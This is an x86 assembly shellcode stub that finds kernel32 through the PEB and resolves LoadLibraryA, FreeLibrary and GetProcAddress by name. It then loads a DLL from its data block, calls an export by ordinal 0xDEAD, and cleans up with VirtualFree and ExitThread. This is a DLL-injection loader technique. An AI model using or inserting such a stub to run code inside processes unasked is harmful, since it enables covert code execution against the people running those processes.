BITS 32

ShellCode:
  mov     eax,dword [fs:00000030h]
  sub     esp,10h
  push    ebx
  push    ebp
  push    esi
  push    edi
  mov     edi,dword [esp+24h]
  mov     dword [edi+1000h],eax
  mov     ebp,dword [eax+0Ch]
  mov     edx,dword [edi+1008h]
  add     ebp,14h
  mov     ebx,dword [ebp]
  cmp     ebx,ebp
  je      label_0xa0

label_0x2a:
  nop     word [eax+eax]

label_0x30:
  mov     eax,dword [ebx+28h]
  test    edx,edx
  jne     label_0x61

label_0x37:
  cmp     dword [eax],45004Bh
  jne     label_0x61

label_0x3f:
  cmp     dword [eax+4],4E0052h
  jne     label_0x61

label_0x48:
  cmp     dword [eax+8],4C0045h
  jne     label_0x61

label_0x51:
  cmp     dword [eax+0Ch],320033h
  jne     label_0x61

label_0x5a:
  cmp     word [eax+10h],2Eh
  je      label_0x8d

label_0x61:
  cmp     dword [eax],65006Bh
  mov     esi,edx
  jne     label_0x98

label_0x6b:
  cmp     dword [eax+4],6E0072h
  jne     label_0x98

label_0x74:
  cmp     dword [eax+8],6C0065h
  jne     label_0x98

label_0x7d:
  cmp     dword [eax+0Ch],320033h
  jne     label_0x98

label_0x86:
  cmp     word [eax+10h],2Eh
  jne     label_0x98

label_0x8d:
  mov     edx,dword [ebx+10h]
  mov     esi,edx
  mov     dword [edi+1008h],edx

label_0x98:
  mov     ebx,dword [ebx]
  cmp     ebx,ebp
  jne     label_0x30

label_0x9e:
  jmp     label_0xa2

label_0xa0:
  mov     esi,edx

label_0xa2:
  mov     eax,5A4Dh
  cmp     word [esi],ax
  jne     label_0x259

label_0xb0:
  mov     ecx,dword [esi+3Ch]
  cmp     dword [esi+ecx],4550h
  jne     label_0x259

label_0xc0:
  movzx   eax,word [esi+ecx+18h]
  mov     edx,10Bh
  cmp     ax,dx
  jne     label_0xd6

label_0xcf:
  mov     eax,74h
  jmp     label_0xe9

label_0xd6:
  mov     edx,20Bh
  cmp     ax,dx
  jne     label_0x259

label_0xe4:
  mov     eax,84h

label_0xe9:
  add     eax,esi
  xor     ebx,ebx
  mov     ebp,dword [eax+ecx+4]
  mov     eax,dword [ebp+esi+20h]
  add     ebp,esi
  add     eax,esi
  mov     dword [esp+10h],eax
  mov     edx,dword [ebp+24h]
  mov     ecx,dword [ebp+1Ch]
  add     edx,esi
  add     ecx,esi
  mov     dword [esp+14h],edx
  mov     dword [esp+24h],ecx
  cmp     dword [ebp+18h],ebx
  jbe     label_0x1d8

label_0x118:
  nop     dword [eax+eax]

label_0x120:
  mov     ecx,dword [eax+ebx*4]
  movzx   eax,word [edx+ebx*2]
  add     ecx,esi
  mov     edx,dword [esp+24h]
  mov     edx,dword [edx+eax*4]
  add     edx,esi
  cmp     dword [edi+1010h],0
  jne     label_0x163

label_0x13b:
  cmp     dword [ecx],64616F4Ch
  jne     label_0x163

label_0x143:
  cmp     dword [ecx+4],7262694Ch
  jne     label_0x163

label_0x14c:
  cmp     dword [ecx+8],57797261h
  jne     label_0x163

label_0x155:
  cmp     byte [ecx+0Ch],0
  jne     label_0x163

label_0x15b:
  mov     dword [edi+1010h],edx
  jmp     label_0x1c6

label_0x163:
  cmp     dword [edi+1018h],0
  jne     label_0x18e

label_0x16c:
  cmp     dword [ecx],65657246h
  jne     label_0x18e

label_0x174:
  cmp     dword [ecx+4],7262694Ch
  jne     label_0x18e

label_0x17d:
  cmp     dword [ecx+8],797261h
  jne     label_0x18e

label_0x186:
  mov     dword [edi+1018h],edx
  jmp     label_0x1c6

label_0x18e:
  cmp     dword [edi+1020h],0
  jne     label_0x1c6

label_0x197:
  cmp     dword [ecx],50746547h
  jne     label_0x1c6

label_0x19f:
  cmp     dword [ecx+4],41636F72h
  jne     label_0x1c6

label_0x1a8:
  cmp     dword [ecx+8],65726464h
  jne     label_0x1c6

label_0x1b1:
  mov     eax,dword [ecx+0Ch]
  and     eax,0FFFFFFh
  cmp     eax,7373h
  jne     label_0x1c6

label_0x1c0:
  mov     dword [edi+1020h],edx

label_0x1c6:
  mov     eax,dword [esp+10h]
  inc     ebx
  mov     edx,dword [esp+14h]
  cmp     ebx,dword [ebp+18h]
  jb      label_0x120

label_0x1d8:
  mov     ecx,dword [edi+1010h]
  lea     eax,[edi+800h]
  push    eax
  call    ecx
  mov     esi,eax
  test    esi,esi
  je      label_0x21b

label_0x1fd:
  mov     ecx,dword [edi+1020h]
  push    0DEADh
  push    esi
  call    ecx
  test    eax,eax
  je      label_0x212

label_0x20f:
  push    edi
  call    eax

label_0x212:
  mov     eax,dword [edi+1018h]
  push    esi
  call    eax

label_0x21b:
  mov     eax,dword [edi+1020h]
  lea     ecx,[edi+string_ExitThread]
  push    ecx
  push    dword [edi+1008h]
  call    eax
  mov     ecx,dword [edi+1020h]
  mov     esi,eax
  lea     eax,[edi+string_VirtualFree]
  push    eax
  push    dword [edi+1008h]
  call    ecx
  test    eax,eax
  je      label_0x259

label_0x247:
  test    esi,esi
  je      label_0x259

label_0x24b:
  push    8000h
  push    0
  push    edi

  push    esi
  jmp     eax

label_0x259:
  pop     edi
  pop     esi
  pop     ebp
  pop     ebx
  add     esp,10h
  ret     4

string_VirtualFree db "VirtualFree",0
string_ExitThread db "ExitThread",0
